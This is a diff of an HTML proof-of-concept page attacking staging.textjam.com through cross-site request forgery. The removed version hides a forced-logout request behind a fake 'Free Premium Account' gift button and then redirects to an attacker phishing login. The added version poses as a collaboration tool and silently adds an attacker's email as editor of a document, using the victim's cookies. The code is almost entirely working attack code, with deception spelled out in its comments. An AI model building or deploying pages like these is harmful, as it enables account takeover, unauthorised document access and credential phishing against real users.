@@ -1,80 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free Gift Claim</title>
+    <title>Document Collaboration Tool</title>
     <style>
-        body { font-family: Arial; padding: 20px; text-align: center; }
-        .gift { font-size: 48px; margin: 20px; }
-        .btn { 
-            background: #FF6B6B; 
-            color: white; 
-            padding: 15px 30px; 
-            border: none; 
-            border-radius: 10px; 
-            font-size: 18px; 
-            cursor: pointer;
-            margin: 20px;
-        }
+        .container { padding: 30px; font-family: Arial; }
+        .doc-id { background: #f0f0f0; padding: 10px; border-radius: 5px; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div class="gift">🎁</div>
-    <h2>Claim Your Free Premium Account!</h2>
-    <p>Click below to verify your eligibility...</p>
-    
-    <button class="btn" onclick="performAttack()">Claim Now</button>
-    
-    <div id="status" style="margin-top: 20px; color: #666;"></div>
+    <div class="container">
+        <h2>📄 Document Collaboration Manager</h2>
+        <p>Managing document: <span class="doc-id">KAM7CN17</span></p>
+        
+        <div style="background: #E8F4FD; padding: 20px; border-radius: 8px; margin: 20px 0;">
+            <h3>Add Collaborator</h3>
+            <p>Email to add as editor:</p>
+            <input type="email" id="collabEmail" 
+                   value="rathnaitsergey692@gmail.com" 
+                   style="width: 300px; padding: 8px; margin: 10px 0;">
+            <br>
+            <button onclick="addCollaborator()" 
+                    style="background: #007BFF; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
+                ➕ Add as Editor
+            </button>
+        </div>
+        
+        <div id="status"></div>
+    </div>
 
     <script>
-    function performAttack() {
-        document.getElementById('status').innerHTML = "Verifying your account...";
+    function addCollaborator() {
+        const email = document.getElementById('collabEmail').value;
+        document.getElementById('status').innerHTML = 
+            `<p style="color: #007BFF;">🔄 Adding ${email} as editor...</p>`;
         
-        // Perform stealth logout CSRF
-        fetch('https://staging.textjam.com/api/auth/logout', {
+        // CSRF to add attacker as editor
+        fetch('https://staging.textjam.com/api/doc/KAM7CN17/access/collaborator/editor', {
             method: 'POST',
-            credentials: 'include',  // Send cookies
-            mode: 'no-cors',         // Avoid CORS issues
+            credentials: 'include',
+            mode: 'no-cors',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({action: 'logout'})
+            body: JSON.stringify({
+                email: email
+            })
         })
         .then(() => {
-            document.getElementById('status').innerHTML = "✅ Account verified! Redirecting...";
+            document.getElementById('status').innerHTML = 
+                `<p style="color: #28A745;">✅ ${email} added as editor successfully!</p>`;
             
-            // Redirect to phishing page after logout
+            // Optional: Verify by trying to access document
             setTimeout(() => {
-                window.location.href = "https://staging.textjam.com/login?message=Session+expired+please+login+again";
+                window.location.href = `https://staging.textjam.com/doc/KAM7CN17`;
             }, 1500);
         })
         .catch(error => {
-            document.getElementById('status').innerHTML = "⚠️ Verification failed. Trying alternative method...";
-            fallbackMethod();
+            document.getElementById('status').innerHTML = 
+                `<p style="color: #DC3545;">❌ Error: ${error.message}</p>`;
         });
     }
     
-    function fallbackMethod() {
-        // Alternative: Form submission method
-        var form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://staging.textjam.com/api/auth/logout';
-        form.style.display = 'none';
-        
-        // Try to include CSRF token if we can steal it
-        var csrfInput = document.createElement('input');
-        csrfInput.type = 'hidden';
-        csrfInput.name = 'csrf_token';
-        csrfInput.value = 'attacker_token'; // Would need real token
-        
-        form.appendChild(csrfInput);
-        document.body.appendChild(form);
-        form.submit();
-        
-        setTimeout(() => {
-            window.location.href = "https://attacker-server.com/phishing-login";
-        }, 1000);
-    }
+    // Auto-fill with current user's email for more deception
+    window.addEventListener('load', function() {
+        // Try to get user's email from page or cookies
+        const userEmail = 'currentuser@example.com'; // Would need to extract
+        if (userEmail) {
+            document.getElementById('collabEmail').value = userEmail;
+            document.getElementById('collabEmail').placeholder = "Currently: " + userEmail;
+        }
+    });
     </script>
 </body>
 </html>
